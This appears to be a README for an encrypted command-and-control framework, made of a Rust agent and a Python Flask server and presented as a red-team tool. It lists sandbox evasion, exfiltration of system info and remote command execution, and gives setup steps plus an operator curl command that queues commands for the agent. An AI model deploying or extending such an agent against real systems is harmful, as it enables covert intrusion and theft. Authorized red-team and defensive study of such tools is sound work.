# 🛡️ Rust Encrypted C2 Framework

A minimal yet secure Command-and-Control (C2) system written in Rust and Python. The Rust-based agent securely communicates with a Python-based HTTPS server using AES-GCM encryption and Base64 encoding.


## 📌 Features

- 🔐 AES-GCM 256-bit encryption (authenticated)
- 📡 Encrypted beacon and command channels over HTTPS
- 🧠 Anti-analysis checks (detects VMs/sandboxes)
- 🧾 System info exfiltration (user + OS)
- 🕵️ Remote command execution
- 🎯 Built for stealth and modularity in red team simulations


## 🧱 Architecture
```
+------------------------+ +--------------------------+
| 🐧 Rust Agent (client)<---> | 🔥 Flask HTTPS Server |
+------------------------+ +--------------------------+
```

Communication:

- POST /beacon → Encrypted system info
- GET /cmd → Encrypted command from operator
- POST /result → Encrypted output of executed command

## 🚀 Quickstart

### 1. Setup Server (Python Flask)

```bash
cd server
python3 -m venv venv
source venv/bin/activate
pip install flask cryptography
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
python3 server.py
```
(Follow TLS_cert_setup if required)

![image](https://github.com/user-attachments/assets/64a0e91f-92b2-47f0-87ec-336141a639de)

### 2. Setup Client (Rust Agent)
```
cd client
cp ../server/cert.pem ca.crt
cargo build --release
./target/release/client
```
![image](https://github.com/user-attachments/assets/e4bf0208-d6f1-49cf-b2ec-b3314e7f7d98)

![image](https://github.com/user-attachments/assets/1d8f43b2-32fd-415c-89ff-939fbb74b439)

NOTE: Change the IP address in main.rs to your target.

## 🔐 Encryption Details

- Algorithm: AES-256-GCM
- Key: 32-byte hardcoded key (can be rotated)
- Nonce: 12-byte static nonce (for demo purposes only)
- Encoding: Base64 for transport

⚠️ Do not reuse static nonce in production. Consider random nonce + associated data for secure deployments.

## 📬 Operator Command Interface
Send a command to agent:
```
curl -k -X POST https://127.0.0.1:5000/send -d 'whoami'
```

Server will:

- Encrypt it with AES-GCM
- Client will pull /cmd, decrypt, execute, and POST back encrypted result to /result

## 🧪 Tested On

- ✅ Ubuntu 22.04 LTS
- ✅ Python 3.10
- ✅ Rust 1.77+

## ⚠️ Legal Notice
This tool is intended for educational and authorized red teaming purposes only. Unauthorized access or deployment of malware is strictly illegal. Use responsibly.
